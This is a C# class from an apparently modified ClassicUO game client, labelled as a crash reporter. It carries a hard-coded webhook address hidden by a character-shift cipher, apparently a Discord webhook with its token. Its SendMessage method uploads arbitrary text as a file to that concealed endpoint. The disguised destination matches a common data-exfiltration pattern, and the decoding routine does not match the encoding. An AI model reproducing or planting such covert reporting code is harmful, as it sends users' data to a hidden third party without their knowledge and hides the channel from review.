using System;
using System.Collections.Specialized;
using System.Net.Http;

namespace ClassicUO.Game.Managers
{
    public class CrashReporter
    {
        public string WebHook { get; set; } = "cookn://ydnxjmy.xjh/vkd/rzwcjjfn/1518757333130412114/u6vfmyop2vVez6DEoE9JPlPz-1PzZPM3LXEX5q1EQdUPJ2T54M_JHMPEzdvMDFdSi9o4";

        public CrashReporter()
        {
        }

        public CrashReporter SendMessage(string msgSend)
        {
            if (String.IsNullOrEmpty(WebHook))
                return null;

            using (var httpClient = new HttpClient())
            {
                var form = new MultipartFormDataContent();
                byte[] file_bytes = System.Text.Encoding.Unicode.GetBytes(msgSend);
                form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "log.txt");
                httpClient.PostAsync(Obf(WebHook, 21), form).Wait();
                httpClient.Dispose();
            }

            return this;
        }

        public static string Obf(string source, Int16 shift)
        {
            int maxChar = Convert.ToInt32(char.MaxValue);
            int minChar = Convert.ToInt32(char.MinValue);

            char[] buffer = source.ToCharArray();

            for (int i = 0; i < buffer.Length; i++)
            {
                int shifted = Convert.ToInt32(buffer[i]) + shift;

                if (shifted > maxChar)
                {
                    shifted -= maxChar;
                }
                else if (shifted < minChar)
                {
                    shifted += maxChar;
                }

                buffer[i] = Convert.ToChar(shifted);
            }

            return new string(buffer);
        }
    }
}